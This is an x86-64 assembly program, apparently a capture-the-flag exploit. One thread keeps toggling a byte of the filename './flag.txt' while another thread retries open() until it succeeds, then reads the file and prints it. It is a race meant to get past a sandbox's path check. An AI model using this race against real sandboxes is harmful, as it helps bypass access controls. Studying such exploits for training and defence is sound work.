section .text
global _start

thread_routine:
	mov rdi, filename
.loop:
	
	xor byte [rdi+0x2], 0x1

	movzx rax, byte [stop]
	test rax, rax
	jz .loop
	mov rdi, 44
	jmp exit

_start:
	; mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0)
	mov rdi, 0
	mov rsi, 0x1000
	mov rdx, 0x3 ; PROT_READ | PROT_WRITE
	mov r10, 0x2|0x20   ; MAP_ANONYMOUS | MAP_PRIVATE
	mov r8, 0
	mov r9, 0
	mov rax, 9
	syscall

	; clone
	mov rdi, 0x10900  ; CLONE_VM | CLONE_SIGHAND | CLONE_THREAD
	mov rsi, rax
	mov rdx, 0
	mov r10, 0
	mov r8, 0
	mov r9, 0
	mov rax, 56
	syscall

	test rax, rax
	jz thread_routine

.opener:
	; open(filename, O_RDONLY)
	mov rdi, filename
	mov rsi, 0x0
	mov rax, 2
	syscall

	cmp rax, 0
	jl .opener
	
	mov byte [stop], 1

	; read(fd, flag_data, 0x64)
	mov rdi, rax
	mov rsi, flag_data
	mov rdx, 0x64
	mov rax, 0
	syscall

	; write(2, flag_data, 0x64)
	mov rdi, 2
	mov rsi, flag_data
	mov rdx, 0x64
	mov rax, 1
	syscall

    mov rdi, 55
exit:
    mov rax, 0x3c
    syscall


section .data
    filename db "./flag.txt", 0x0
	flag_data times 0x64 db 0
	stop db 0x0

